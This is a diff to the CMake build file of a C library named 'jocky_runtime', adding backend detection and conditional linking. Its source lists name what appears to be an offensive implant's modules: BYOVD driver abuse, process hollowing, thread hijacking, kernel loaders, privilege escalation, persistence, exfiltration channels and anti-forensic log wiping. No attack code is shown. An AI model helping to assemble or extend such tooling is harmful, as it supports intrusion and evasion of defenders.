@@ -4,6 +4,66 @@ project(jocky_runtime C CXX)
 set(CMAKE_C_STANDARD 11)
 set(CMAKE_CXX_STANDARD 14)
 
+# ============================================================================
+# HEADER DETECTION & BACKEND SELECTION
+# ============================================================================
+include(CheckIncludeFile)
+include(CheckIncludeFileCXX)
+
+# Detect optional cryptography libraries
+check_include_file(openssl/ssl.h HAVE_OPENSSL)
+check_include_file(openssl/evp.h HAVE_OPENSSL_EVP)
+
+# Detect optional compression libraries
+check_include_file(zlib.h HAVE_ZLIB)
+
+# Detect optional Windows-specific headers
+if(WIN32)
+    check_include_file(wevtapi.h HAVE_WEVTAPI)
+    check_include_file(winternl.h HAVE_WINTERNL)
+    check_include_file(psapi.h HAVE_PSAPI)
+    check_include_file(winsock2.h HAVE_WINSOCK)
+endif()
+
+# Detect optional Linux-specific headers
+if(UNIX AND NOT APPLE)
+    check_include_file(sys/resource.h HAVE_SYS_RESOURCE)
+endif()
+
+# ============================================================================
+# BACKEND SELECTION LOGIC
+# ============================================================================
+
+# Crypto backend selection
+if(HAVE_OPENSSL AND HAVE_OPENSSL_EVP)
+    set(CRYPTO_BACKEND "openssl_impl")
+else()
+    set(CRYPTO_BACKEND "portable_impl")
+endif()
+
+# Compression backend selection
+if(HAVE_ZLIB)
+    set(COMPRESS_BACKEND "zlib_impl")
+else()
+    set(COMPRESS_BACKEND "portable_impl")
+endif()
+
+# Logging backend selection
+if(WIN32 AND HAVE_WEVTAPI)
+    set(LOGGING_BACKEND "windows_impl")
+elseif(UNIX AND NOT APPLE)
+    set(LOGGING_BACKEND "linux_impl")
+else()
+    set(LOGGING_BACKEND "portable_impl")
+endif()
+
+# Network backend selection
+if(HAVE_OPENSSL)
+    set(NETWORK_BACKEND "openssl_impl")
+else()
+    set(NETWORK_BACKEND "portable_impl")
+endif()
+
 # Runtime source files
 set(RUNTIME_SOURCES
     init/anti_analysis.c
@@ -37,21 +97,22 @@ set(RUNTIME_SOURCES
     byovd/byovd_manifest.c
     byovd/byovd_modular.c
 
-    # Compression utilities
-    compression/compression.c
-
     # Encoding utilities
     common/encoding.c
+
+    # Compression - existing implementations with jocky_* FFI functions
+    compression/compression.c
+    compression/compression_simple.c
 
     # Core APIs
     core/sandbox.c
     core/plugin.c
 
-    # Cryptography
-    crypto/crypto.c
-
-    # Networking
-    network/network.c
+    # Conditional backend implementations
+    backends/crypto/${CRYPTO_BACKEND}.c
+    backends/compress/${COMPRESS_BACKEND}.c
+    backends/logging/${LOGGING_BACKEND}.c
+    backends/network/${NETWORK_BACKEND}.c
 
     # Obfuscation
     obfuscation.c
@@ -74,7 +135,6 @@ set(RUNTIME_SOURCES
     forensics/plugins/collectors/usnjrnl_collector.c
 
     # Forensic plugins - parsers
-    forensics/plugins/parsers/pe_parser.c
     forensics/plugins/parsers/registry_parser.c
     forensics/plugins/parsers/evtx_parser.c
     forensics/plugins/parsers/prefetch_parser.c
@@ -164,9 +224,6 @@ set(RUNTIME_SOURCES
     linux/forensics/linux_forensics.c
     linux/forensics/cleanup.c
 
-    # Linux missing APIs
-    linux/missing_apis.c
-
     # Forensic analysis pipeline (Kamimi)
     # TODO: forensics/* - not yet integrated. Integration path:
     #       1. Reorganize headers: move forensic_types.h, analysis.h, provenance.h to forensics/ root
@@ -235,11 +292,57 @@ if(UNIX OR NOT WIN32)
         windows/anti_forensics/self_delete.c
         windows/anti_forensics/logs.c
         windows/anti_forensics/forensics.c
+        windows/windows_api_impl.c
         pack/stub_loader.c
         windows/registry/registry.c
         byovd/driver_scoring.c
         byovd/byovd_manifest.c
         byovd/byovd_modular.c
+    )
+elseif(WIN32)
+    # Remove Linux-only sources on Windows
+    message(STATUS "Removing Linux-only sources for Windows build")
+    list(REMOVE_ITEM RUNTIME_SOURCES
+        exploitation/linux_kernel.c
+        linux/syscalls/syscall.c
+        linux/syscalls/sysinfo_syscall.c
+        linux/syscalls/env_syscall.c
+        linux/syscalls/file_syscall.c
+        linux/syscalls/dir_syscall.c
+        linux/syscalls/mem_syscall.c
+        linux/syscalls/signal_syscall.c
+        linux/syscalls/ipc_syscall.c
+        linux/syscalls/util_syscall.c
+        linux/process/process_syscall.c
+        linux/process/process_control_syscall.c
+        linux/process/hollow.c
+        linux/process/process_hollow.c
+        linux/process/advanced_process_ops.c
+        linux/process/ptrace_control.c
+        linux/process/thread_hijack.c
+        linux/kernel/lkm_loader.c
+        linux/kernel/ebpf_loader.c
+        linux/kernel/modules.c
+        linux/kernel/advanced_syscalls.c
+        linux/kernel/advanced_kernel_ops.c
+        linux/kernel/module_loader.c
+        linux/kernel/module_ops.c
+        linux/kernel/kread_kwrite.c
+        linux/kernel/byovd_ops.c
+        linux/anti_analysis/anti_analysis.c
+        linux/anti_analysis/detection.c
+        linux/lpe/fence2pwn.c
+        linux/core/audit_ops.c
+        linux/core/runtime_init.c
+        linux/core/sandbox_ops.c
+        linux/persistence.c
+        linux/persistence/cron_systemd.c
+        linux/exfil/exfil_channels.c
+        linux/io/io_core.c
+        linux/threading/threadpool.c
+        linux/networking/network.c
+        linux/forensics/linux_forensics.c
+        linux/forensics/cleanup.c
     )
 endif()
 
@@ -248,12 +351,81 @@ add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
 target_include_directories(jocky_rt PUBLIC include)
 target_include_directories(jocky_rt PUBLIC ${CMAKE_SOURCE_DIR}/../../include)
 
-if(WIN32)
-    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
-else()
-    # Linux: link against libdl for dlopen/dlsym
-    target_link_libraries(jocky_rt PUBLIC dl)
+# ============================================================================
+# CONDITIONAL LIBRARY LINKING
+# ============================================================================
+
+# Link OpenSSL if detected
+if(HAVE_OPENSSL)
+    find_package(OpenSSL QUIET)
+    if(OPENSSL_FOUND)
+        target_link_libraries(jocky_rt PUBLIC OpenSSL::Crypto)
+    endif()
 endif()
+
+# Link zlib if detected
+if(HAVE_ZLIB)
+    find_package(ZLIB QUIET)
+    if(ZLIB_FOUND)
+        target_link_libraries(jocky_rt PUBLIC ZLIB::ZLIB)
+    endif()
+endif()
+
+# Platform-specific libraries
+if(WIN32)
+    # Core Windows libraries
+    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi)
+
+    # Windows Event Log if detected
+    if(HAVE_WEVTAPI)
+        target_link_libraries(jocky_rt PUBLIC wevtapi)
+    endif()
+
+    # Windows socket if detected
+    if(HAVE_WINSOCK)
+        target_link_libraries(jocky_rt PUBLIC ws2_32)
+    endif()
+
+    # Other Windows libraries
+    target_link_libraries(jocky_rt PUBLIC kernel32 advapi32)
+else()
+    # POSIX/Linux libraries
+    target_link_libraries(jocky_rt PUBLIC dl m)
+
+    # Optional resource limit support on Linux
+    if(HAVE_SYS_RESOURCE)
+        # prlimit support available at compile time
+    endif()
+endif()
+
+# ============================================================================
+# BUILD CONFIGURATION SUMMARY
+# ============================================================================
+
+message(STATUS "=== JOCKY Runtime Configuration ===")
+message(STATUS "Platform: ${CMAKE_SYSTEM_NAME}")
+message(STATUS "C Standard: ${CMAKE_C_STANDARD}")
+message(STATUS "CXX Standard: ${CMAKE_CXX_STANDARD}")
+message(STATUS "")
+message(STATUS "Backend Selection:")
+message(STATUS "  Crypto backend: ${CRYPTO_BACKEND}")
+message(STATUS "  Compress backend: ${COMPRESS_BACKEND}")
+message(STATUS "  Logging backend: ${LOGGING_BACKEND}")
+message(STATUS "  Network backend: ${NETWORK_BACKEND}")
+message(STATUS "")
+message(STATUS "Header Detection:")
+message(STATUS "  OpenSSL (crypto + EVP): ${HAVE_OPENSSL} + ${HAVE_OPENSSL_EVP}")
+message(STATUS "  zlib (compression): ${HAVE_ZLIB}")
+if(WIN32)
+    message(STATUS "  Windows Event Log (wevtapi.h): ${HAVE_WEVTAPI}")
+    message(STATUS "  Windows internals (winternl.h): ${HAVE_WINTERNL}")
+    message(STATUS "  Windows Process API (psapi.h): ${HAVE_PSAPI}")
+    message(STATUS "  Windows sockets (winsock2.h): ${HAVE_WINSOCK}")
+endif()
+if(UNIX AND NOT APPLE)
+    message(STATUS "  System resource limits (sys/resource.h): ${HAVE_SYS_RESOURCE}")
+endif()
+message(STATUS "=====================================")
 
 # Example: build a test executable
 # add_executable(rt_test tests/rt_test.c)
